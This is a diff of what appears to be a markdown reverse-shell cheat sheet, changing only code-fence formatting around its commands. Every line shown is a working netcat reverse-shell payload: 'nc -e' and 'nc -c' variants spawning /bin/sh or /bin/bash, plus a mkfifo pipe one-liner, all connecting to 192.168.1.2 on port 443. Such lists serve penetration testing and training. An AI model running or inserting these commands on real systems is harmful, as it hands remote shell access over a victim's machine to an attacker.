@@ -101,15 +101,22 @@
   
   ```cmd
   nc -e /bin/sh 192.168.1.2 443
-
+  ```
+ 
+  ```cmd 
   nc -e /bin/bash 192.168.1.2 443
-  
+  ```
+ 
   # <kbd>-c</kbd>
   
+  ```cmd 
   nc -c /bin/sh 192.168.1.2 443
-  
+  ```
+ 
+  ```cmd
   nc -c /bin/bash 192.168.1.2 443
-  
+  ```
+ 
   # <kbd>fifo</kbd>
   
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
